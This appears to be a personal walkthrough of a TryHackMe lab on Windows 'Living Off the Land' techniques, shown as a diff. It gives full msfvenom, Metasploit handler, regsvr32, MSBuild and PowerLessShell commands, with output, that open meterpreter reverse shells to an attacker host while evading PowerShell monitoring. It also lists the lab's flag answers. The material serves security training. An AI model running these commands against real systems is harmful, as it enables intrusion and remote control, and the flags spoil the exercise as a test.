@@ -274,3 +274,280 @@ msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
 payload => windows/meterpreter/reverse_tcp
 ```
 ```text
+msf6 exploit(multi/handler) > set LHOST ATTACKBOX_IP
+LHOST => ATTACKBOX_IP
+```
+```text
+msf6 exploit(multi/handler) > set LPORT 443 
+LPORT => 443
+```
+```text
+msf6 exploit(multi/handler) > exploit 
+
+[*] Started reverse TCP handler on ATTACKBOX_IP:443
+```
+Note that we specified the output type as DLL using the-f argument. Once the malicious DLL file is generated, we need to deliver the payload to the victim machine. We will do this by using a webserver to serve the DLL file on our attacking machine as follows,
+```text
+Terminal
+
+           
+			
+user@machine$ python3 -m http.server 1337
+```
+From the victim machine, visit the webserver of the attacking machine on port 1337 that we specify. Note that this port can be changed with your choice!
+On the victim machine, once the file DLL file is downloaded, we execute it using regsvr32.exe  as follows,
+```text
+Command Prompt
+
+           
+			
+C:\Users\thm> c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
+or
+C:\Users\thm> c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
+```
+With the second option, which is a more advanced command, we instruct the regsvr32.exe to run:
+/s: in silent mode (without showing messages)
+/n: to not call the DLL register server
+/i:: to use another server since we used /n
+/u: to run with unregister method
+On the attacking machine, we should receive a reverse shell.
+```text
+Terminal
+```
+```text
+msf6 > exploit(multi/handler) > exploit 
+
+[*] Started reverse TCP handler on ATTACKBOX_IP:443 
+[*] Sending stage (175174 bytes) to 10.10.159.197 
+[*] Meterpreter session 1 opened (ATTACKBOX_IP:443 -> 10.10.159.197:52845 ) at 2022-01-20 05:51:31 -0600
+```
+Note if we wanted to create a 64-bit DLL version, we need to specify it in the msfvenom command and run it from the victim machine using the 64bits version of regsvr32.exe at C:\Windows\SysWOW64\regsvr32.exe.
+Bourne Again Shell (Bash)
+Bourne Again Shell (Bash)
+In 2016, Microsoft added support for the Linux environment on Windows 10,11, and Server 2019. This feature is known as Windows Subsystem for Linux (WSL), and it exists in two WSL versions: WSL1 and WSL2. WSL is a Hyper-V virtualized Linux distribution that runs on the operating system, supporting a subset of the Linux kernel and system calls. This feature is an addon that a user can install and interact with a Linux distribution. As part of WSL, bash.exe is a Microsoft tool for interacting with the Linux environment.
+People found ways to execute payloads and bypass the Windows application whitelisting since it is a Microsoft signed binary. By executing bash.exe -c "path-to-payload", we can execute any unsigned payload. ATT&CK called this an Indirect Command execution technique where attackers abuse the Windows tools utility to obtain command executions. For more information about this technique, you may visit the T1202 ATT&CK website.
+Note that you need to enable and install the Windows Subsystem for Linux in Windows 10 to use the bash.exe binary. Also, the attached VM does not have the Linux Subsystem enabled due to nested virtualization restrictions.
+Keep in mind that this section highlighted a couple of interesting tools. If you are interested in checking out the LOLBAS tools available, you may visit the project website.
+For more information about bypassing Windows security controls, we suggest checking the THM room: Bypassing UAC and Applocker once released!
+*No answer needed*
+![[Pasted image 20220910225928.png]]
+```text
+download 
+PS C:\Users\thm> c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ msfconsole -q
+```
+```text
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+```
+```text
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
+_
+[-] The value specified for payload is not valid.
+```
+```text
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+```
+```text
+msf6 exploit(multi/handler) > set lhost 10.11.81.220
+lhost => 10.11.81.220
+```
+```text
+msf6 exploit(multi/handler) > set lport 443
+lport => 443
+```
+```text
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.11.81.220:443 
+[*] Sending stage (175174 bytes) to 10.10.45.70
+[*] Meterpreter session 1 opened (10.11.81.220:443 -> 10.10.45.70:50125 ) at 2022-09-10 23:57:13 -0400
+```
+```text
+meterpreter > whoami
+[-] Unknown command: whoami
+```
+```text
+meterpreter > pwd
+C:\Users\thm
+```
+### Other Techniques
+This section highlights a couple of interesting techniques used, whether for initial access or persistence. The following techniques belong to the Living Off the Land umbrella since they can be used as part of the Windows environment utilities.
+Shortcuts
+Shortcuts or symbolic links are a technique used for referring to other files or applications within the operating system. Once a user clicks on the shortcut file, the reference file or application is executed. Often, the Red team leverages this technique to gain initial access, privilege escalation, or persistence. The MITRE ATT&CK framework calls this Shortcut modification technique T1547, where an attacker creates or modifies a shortcut in order to take advantage of this technique.
+To use the shortcut modification technique, we can set the target section to execute files using:
+Rundll32
+Powershell
+Regsvr32
+Executable on disk
+The attached figure shows an example of a shortcut modification technique, where the attacker modified the Excel target section to execute a binary using rundll32.exe. We choose to execute a calculator instead of running the Excel application. Once the victim clicks on the Excel shortcut icon, the calc.exe is executed. For more information about shortcut modification, you may check this GitHub [repo](https://github.com/jesusgavancho/atomic-red-team).
+No PowerShell!
+In 2019, Red Canary published a threat detection report stating that PowerShell is the most used technique for malicious activities. Therefore, Organizations started to monitor or block powershell.exe from being executed. As a result, adversaries find other ways to run PowerShell code without spawning it.
+PowerLessShell is a Python-based tool that generates malicious code to run on a target machine without showing an instance of the PowerShell process. PowerLessShell relies on abusing the Microsoft Build Engine (MSBuild), a platform for building Windows applications, to execute remote code.
+First, let's download a copy of the project from the GitHub repo onto the AttackBox:
+```text
+Terminal
+
+           
+			
+user@machine$ git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
+```
+One of the project requirements is to get a PowerShell payload to make it suitable to work with MSBuild. On the AttackBox, we need to generate a PowerShell payload using msfvenom as follows:
+```text
+Terminal
+
+           
+			
+user@machine$ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
+```
+Also, we need to run the Metasploit framework to listen and wait for the reverse shell.
+```text
+Terminal
+
+           
+			
+user@machine$ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"
+[*] Using configured payload generic/shell_reverse_tcp
+payload => windows/meterpreter/reverse_winhttps
+lhost => AttackBox_IP lport => 4443
+[*] Started HTTPS reverse handler on https://AttackBox_IP:4443
+```
+Now that we have the payload ready, change to the PowerLessShell directory project to convert the payload to be compatible with the MSBuild tool. Then run the PowerLessShell tool and set the source file to the one we created with msfvenom as follows:
+```text
+Terminal
+
+           
+			
+user@machine$ python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
+```
+Once the command is executed successfully, we need to transfer the output file to the Windows machine. You can do this using the SCP command or set a web server to host the file on the AttackBox (python3 -m http.server 1337) and download the file using the browser.
+Finally, on the target Windows machine, build the .csproj file and wait for the reverse shell!
+```text
+Command Prompt!
+
+           
+			
+C:\Users\thm> c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
+```
+Once we run the MSBuild command, wait a couple of seconds till we receive a reverse shell. Note that there will be no powershell.exe process is running.
+Replicate the steps of the No PowerShell technique to receive a reverse shell on port 4444. Once a connection is established, a flag will be created automatically on the desktop. What is the content of the flag file?
+(Use the MSbuild to build the malicious .csproj. Make sure to set the LPORT = 4444 on the AttackBox in order to get your flag!)
+```text
+──(kali㉿kali)-[~]
+└─$ git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
+Cloning into 'PowerLessShell'...
+remote: Enumerating objects: 368, done.
+remote: Counting objects: 100% (45/45), done.
+remote: Compressing objects: 100% (42/42), done.
+remote: Total 368 (delta 25), reused 5 (delta 2), pack-reused 323
+Receiving objects: 100% (368/368), 111.97 KiB | 301.00 KiB/s, done.
+Resolving deltas: 100% (207/207), done.
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ls
+armitage-tmp  dict.lst      live0fftheland.dll  PowerLessShell  thm.hta
+book.txt      Documents     multi_launcher      Public          usernames-list.txt
+clinic.lst    Downloads     Music               snmpcheck       Videos
+crunch.txt    ftp_flag.txt  payload.hta         stager2.bat
+Desktop       hashctf2      Pictures            Sublist3r
+dict2.lst     launcher.bat  powercat            Templates
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=10.11.81.220 LPORT=4444 -f psh-reflection > liv0ff.ps1
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 957 bytes
+Final size of psh-reflection file: 3782 bytes
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost 10.11.81.220;set lport 4444;exploit"
+[*] Using configured payload generic/shell_reverse_tcp
+payload => windows/meterpreter/reverse_winhttps
+lhost => 10.11.81.220
+lport => 4444
+[*] Started HTTPS reverse handler on https://10.11.81.220:4444
+[!] https://10.11.81.220:4444 handling request from 10.10.45.70; (UUID: dicek2ku) Without a database connected that payload UUID tracking will not work!
+[*] https://10.11.81.220:4444 handling request from 10.10.45.70; (UUID: dicek2ku) Staging x86 payload (176220 bytes) ...
+
+──(kali㉿kali)-[~]
+└─$ cd PowerLessShell
+```
+```text
+┌──(kali㉿kali)-[~/PowerLessShell]
+└─$ python2 PowerLessShell.py -type powershell -source /home/kali/liv0ff.ps1 -output liv0ff.csproj
+PowerLessShell Less is More
+Mr.Un1k0d3r RingZer0 Team
+-----------------------------------------------------------
+Generating the msbuild file using include/template-powershell.csproj as the template
+File 'liv0ff.csproj' created
+Process completed
+```
+```text
+┌──(kali㉿kali)-[~/PowerLessShell]
+└─$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.45.70 - - [11/Sep/2022 00:17:12] "GET / HTTP/1.1" 200 -
+10.10.45.70 - - [11/Sep/2022 00:17:15] "GET /liv0ff.csproj HTTP/1.1" 200 -
+10.10.45.70 - - [11/Sep/2022 00:17:51] "GET /liv0ff.csproj HTTP/1.1" 304 -
+
+download
+
+C:\Users\thm>c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Downloads\liv0ff.csproj
+Microsoft (R) Build Engine version 4.8.3761.0
+[Microsoft .NET Framework, version 4.0.30319.42000]
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Build started 9/11/2022 4:18:39 AM.
+```
+![[Pasted image 20220910232033.png]]
+### Real-life Scenario
+This task introduces a showcase of malware that used the techniques discussed in this room.
+In 2017, The Windows Defender Advanced Threat Protection ([Windows Defender ATP](https://www.microsoft.com/security/blog/2018/11/15/whats-new-in-windows-defender-atp/)) Research Team discovered Fileless malware named Astaroth. A fileless malware means that the malware runs and is executed in the system without writing to disk. The malware performs all its functions from the victim device's memory.
+Astaroth is known as an information stealer, which takes sensitive information from victim users, such as account credentials, keystrokes, and other data, and sends it to the attacker. The malware relies on various advanced techniques such as anti-debugging, anti-virtualization, anti-emulation tricks, process hollowing, NTFS Alternate Data Streams (ADS), and Living off the land binaries to perform different functions.
+In the initial access stage, attackers rely on a spam campaign that contains malicious attachment files. The attached file is an LNK file shortcut that, once the victim has clicked it, will result in the following:
+A WMIC command is executed to download and run Javascript code.
+Abusing the BITSadmin to download multiple binaries from the command and control server. Interestingly, in some cases, the malware uses YouTube channel descriptions to hide their C2 server commands.
+Using the BITSadmin, ADS technique, to hide their binaries within the system for their persistence.
+A Certutil tool is used to decode a couple of downloaded payloads into DLL files.
+The DLL files are executed using Regsvr32.
+For more details about the malware and the detections, we suggest checking the following references:
+Astaroth: Banking Trojan (https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/)
+Microsoft Discovers Fileless Malware Campaign Dropping Astaroth Info Stealer (https://www.trendmicro.com/vinfo/de/security/news/cybercrime-and-digital-threats/microsoft-discovers-fileless-malware-campaign-dropping-astaroth-info-stealer)
+Astaroth malware hides command servers in YouTube channel descriptions (https://www.zdnet.com/article/astaroth-malware-hides-command-servers-in-youtube-channel-descriptions/)
+### Conclusion
+In this room, we covered the general concept of Living Off the Land as well as went through some of the examples seen and used during red team engagements. The Living Off the Land techniques can be used for various purposes, including reconnaissance, file operations, execution binaries, and persistence and bypass security measures.
+Additional resources
+GTFOBins - The Linux version of the LOLBAS project.
+Astaroth: Banking Trojan - A real-life malware analysis where they showcase using the Living Off the Land technique used by Malware.
+Good work and keep learning!
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6f593d640759b852a7a920dfa11cdd21.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/34c25098ffaac146cd41551ff2bd8cfb.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/75af3683c5d9263c66c2ca4a9cb23a6f.png)
+- ![|333](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e1bbd428b12ab3041748f361ba237e21.png)
+- ![|333](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/aa5cd3489ac1c2a6c315d637bf4ba8ce.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c98596d3c51c192ae9fd415ff06fc6b9.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/4829eca7d15a4e9191a432cd1d35fb75.png)
+- ***THM{ea4e2b9f362320d098635d4bab8a568e}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0468b54d6174a620d130adb1edacc1c.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b1b3be212430f23ddaba1f82f2c2a566.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/239e633cdb273be86d1077949539cb38.png)
+- ***THM{23005dc4369a0eef728aa39ff8cc3be2}***
+
+## Notes / Lessons Learned
+[[Firewalls]]
+
